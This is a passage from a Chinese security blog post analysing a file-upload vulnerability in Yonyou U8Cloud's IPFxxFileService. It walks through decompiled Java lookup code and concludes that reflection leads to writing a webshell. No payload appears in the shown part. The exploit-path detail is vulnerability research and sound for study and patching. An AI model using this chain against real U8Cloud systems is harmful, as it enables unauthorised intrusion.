+                     data-src="https://exp3n5ive.github.io/2025/10/26/%E7%94%A8%E5%8F%8B%20U8Cloud%20IPFxxFileService%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/images/1758693751352-5c70942b-e11a-4c50-abe9-dccf6ac5b74f.png"
+                     
+                ></p>
+<p>可以看到最终都走向了同一个方法 , 现在分析 AbstractContext#lookup :</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 根据组件名称查找并返回对应的组件实例。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 该方法首先尝试从本地缓存中获取组件，如果未找到，则通过 JNDI 查找或根据元数据动态创建组件。</span></span><br><span class="line"><span class="comment"> * 支持 EJB 组件、UserTransaction 以及业务对象（BO）等类型的组件查找。</span></span><br><span class="line"><span class="comment"> * 对于需要事务支持的组件，会进行代理封装以支持事务处理。</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> name 组件名称，我们传的是 nc.bs.framework.core.service.IHRMultiServicesInvorker</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 查找到的组件实例</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ComponentException 如果在查找过程中发生错误，例如组件未找到或不支持</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">lookup</span><span class="params">(String name)</span> <span class="keyword">throws</span> ComponentException &#123;</span><br><span class="line">    <span class="comment">// 非空判断</span></span><br><span class="line">    <span class="keyword">if</span> (name == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ComponentNotFoundException</span>(</span><br><span class="line">            <span class="string">&quot;component name is null when lookup&quot;</span></span><br><span class="line">        );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">retObject</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 先尝试从服务缓存中获取组件 我们默认没有</span></span><br><span class="line">        retObject = <span class="built_in">this</span>.getServiceCache().get(name);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (retObject == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">JndiContext</span> <span class="variable">jndiCtx</span> <span class="operator">=</span> <span class="built_in">this</span>.getJNDIContext();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 处理 java:comp/env/ 开头的 JNDI 名称 我们肯定不满足</span></span><br><span class="line">            <span class="keyword">if</span> (name.startsWith(<span class="string">&quot;java:comp/env/&quot;</span>)) &#123;</span><br><span class="line">                retObject = jndiCtx.lookup(name);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (EJBUtil.isHome(retObject)) &#123;</span><br><span class="line">                    retObject = <span class="built_in">this</span>.serviceFromEJBHome(</span><br><span class="line">                        name, retObject, (ComponentMeta) <span class="literal">null</span></span><br><span class="line">                    );</span><br><span class="line">                    <span class="built_in">this</span>.getServiceCache().put(name, retObject);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 特殊处理 UserTransaction 组件 这里也不满足不用看</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (name.equals(<span class="string">&quot;javax.transaction.UserTransaction&quot;</span>)) &#123;</span><br><span class="line">                retObject = <span class="built_in">this</span>.getUserTransaction();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果仍未找到组件</span></span><br><span class="line">            <span class="keyword">if</span> (retObject == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 检查是否支持 BO 类型组件 这里第二个条件不满足不用看</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">this</span>.supportBO() &amp;&amp; name.endsWith(<span class="string">&quot;BO&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ComponentNotFoundException</span>(</span><br><span class="line">                        String.format(</span><br><span class="line">                            <span class="string">&quot;The BO(3.x) is not supported, please rewrite the component %s&quot;</span>,</span><br><span class="line">                            name</span><br><span class="line">                        )</span><br><span class="line">                    );</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">ComponentMeta</span> <span class="variable">meta</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 尝试查找组件元数据</span></span><br><span class="line">                    meta = <span class="built_in">this</span>.findMeta(name);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ComponentNotFoundException var10) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.getLogger().warn(</span><br><span class="line">                        String.format(</span><br><span class="line">                            <span class="string">&quot;The component(meta): %s is not found in %s %s&quot;</span>,</span><br><span class="line">                            name, <span class="string">&quot;ESA&quot;</span>,</span><br><span class="line">                            <span class="string">&quot; try to search it from jndi.&quot;</span></span><br><span class="line">                        )</span><br><span class="line">                    );</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">originalName</span> <span class="operator">=</span> name;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 若元数据中的名称与当前名称不同，则使用元数据中的名称重新查找缓存</span></span><br><span class="line">                <span class="keyword">if</span> (meta != <span class="literal">null</span> &amp;&amp; !name.equals(meta.getName())) &#123;</span><br><span class="line">                    name = meta.getName();</span><br><span class="line">                    retObject = <span class="built_in">this</span>.getServiceCache().get(name);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 如果仍然未找到组件</span></span><br><span class="line">                <span class="keyword">if</span> (retObject == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">needTx</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">jndiName</span> <span class="operator">=</span> name;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 判断是否需要事务支持，并获取 JNDI 名称</span></span><br><span class="line">                    <span class="keyword">if</span> (meta != <span class="literal">null</span>) &#123;</span><br><span class="line">                        needTx = meta.getTxAttribute() != <span class="literal">null</span></span><br><span class="line">                            &amp;&amp; TxAttribute.NONE != meta.getTxAttribute();</span><br><span class="line">                        jndiName = meta.getEjbName();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 如果没有元数据或需要事务支持，并且不是黑名单服务</span></span><br><span class="line">                    <span class="keyword">if</span> ((meta == <span class="literal">null</span> || needTx) &amp;&amp; !<span class="built_in">this</span>.isBlackService(name)) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="comment">// 通过 JNDI 查找组件</span></span><br><span class="line">                            retObject = <span class="built_in">this</span>.jndi(jndiName);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable var9) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 如果查找到的是 EJB Home，则从中获取服务实例</span></span><br><span class="line">                        <span class="keyword">if</span> (EJBUtil.isHome(retObject)) &#123;</span><br><span class="line">                            retObject = <span class="built_in">this</span>.serviceFromEJBHome(</span><br><span class="line">                                name, retObject, meta</span><br><span class="line">                            );</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 如果需要事务支持并且查找到组件，则创建事务代理</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (needTx &amp;&amp; retObject != <span class="literal">null</span>) &#123;</span><br><span class="line">                            retObject = Proxy.newProxyInstance(</span><br><span class="line">                                retObject.getClass().getClassLoader(),</span><br><span class="line">                                ClassUtil.getInterfaces(</span><br><span class="line">                                    retObject.getClass(),</span><br><span class="line">                                    ServerConstants.excludes</span><br><span class="line">                                ),</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">EJB3ServiceHandler</span>(name, retObject)</span><br><span class="line">                            );</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 缓存查找到的组件</span></span><br><span class="line">                        <span class="keyword">if</span> (retObject != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="built_in">this</span>.getServiceCache().put(name, retObject);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (originalName != name) &#123;</span><br><span class="line">                                <span class="built_in">this</span>.getServiceCache().put(</span><br><span class="line">                                    originalName, retObject</span><br><span class="line">                                );</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// 如果是生产模式并且未找到组件，则标记为黑名单</span></span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.isProductMode()) &#123;</span><br><span class="line">                            <span class="built_in">this</span>.markServiceBlack(name);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (originalName != name) &#123;</span><br><span class="line">                                <span class="built_in">this</span>.markServiceBlack(originalName);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 再次检查是否找到组件</span></span><br><span class="line">                    <span class="keyword">if</span> (retObject == <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 如果是生产模式并且需要事务支持但未找到组件，则抛出异常</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.isProductMode() &amp;&amp; needTx) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ComponentNotFoundException</span>(</span><br><span class="line">                                name,</span><br><span class="line">                                String.format(</span><br><span class="line">                                    <span class="string">&quot;The tx component: %s is not found in %s %s&#125;&quot;</span>,</span><br><span class="line">                                    name, <span class="string">&quot;jndi&quot;</span>,</span><br><span class="line">                                    <span class="string">&quot; please deploy it!&quot;</span></span><br><span class="line">                                ) + <span class="string">&quot; jndiName: &quot;</span> + jndiName</span><br><span class="line">                            );</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 如果没有元数据，则抛出组件未找到异常</span></span><br><span class="line">                        <span class="keyword">if</span> (meta == <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ComponentNotFoundException</span>(</span><br><span class="line">                                name,</span><br><span class="line">                                <span class="string">&quot;Can not find component(both in jndi and ESA)&quot;</span></span><br><span class="line">                            );</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 查找并创建组件实例</span></span><br><span class="line">                        retObject = <span class="built_in">this</span>.findComponent(meta);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 如果需要事务支持并且不在 JAVAEE 环境中，则动态创建 BService</span></span><br><span class="line">                        <span class="keyword">if</span> (needTx &amp;&amp; !<span class="built_in">this</span>.outJAVAEE()) &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="built_in">this</span>.dynamicBService(meta, retObject);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retObject;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>我们跟进 <code>meta = this.findMeta(name);</code> 到 nc.bs.framework.server.AbstractContainer#getMeta</p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 参数为 nc.bs.framework.core.service.IHRMultiServicesInvorker</span></span><br><span class="line"><span class="keyword">public</span> ComponentMeta <span class="title function_">getMeta</span><span class="params">(String name)</span> <span class="keyword">throws</span> ComponentException &#123;</span><br><span class="line">    <span class="type">ComponentMeta</span> <span class="variable">meta</span> <span class="operator">=</span> <span class="built_in">this</span>.publicRepo.getComponentMeta(name);</span><br><span class="line">    <span class="keyword">if</span> (meta == <span class="literal">null</span>) &#123;</span><br><span class="line">        meta = (ComponentMeta)<span class="built_in">super</span>.getMeta(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>动态调试可以知道这里在第三行就拿到了 , 然后返回元数据</p>
+<p>最终经过一系列判断 , 返回了该服务对象 , 最终导致了反射调用恶意方法写 webshell</p>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 用友 U8Cloud IPFxxFileService 文件上传漏洞分析</li>
+        <li><strong>Author:</strong> exp3n5ive</li>
+        <li><strong>Created at
+                :</strong> 2025-10-26 11:24:24</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-10-26 11:26:31
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://exp3n5ive.github.io/2025/10/26/用友 U8Cloud IPFxxFileService 文件上传漏洞分析/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/10/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF-2025/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">2025-羊城杯-Web</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          dark: 'body[class~="dark-mode"]',
+          reaction: false,
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+                    lang: 'zh-CN',
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">用友 U8Cloud IPFxxFileService 文件上传漏洞分析</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#POC"><span class="nav-text">POC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%88%86%E6%9E%90"><span class="nav-text">文件写入分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83%E5%88%86%E6%9E%90"><span class="nav-text">未授权分析</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90"><span class="nav-text">补丁分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="nav-text">详细调用流程</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-chisel fa-regular fa-calendar"></i>&nbsp;&nbsp;<a href="/">exp3n5ive</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        6 posts in total
+                    </span>
+                    
+                        <span>
+                            33.8k words in total
+                        </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/runtime.js"></script>
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
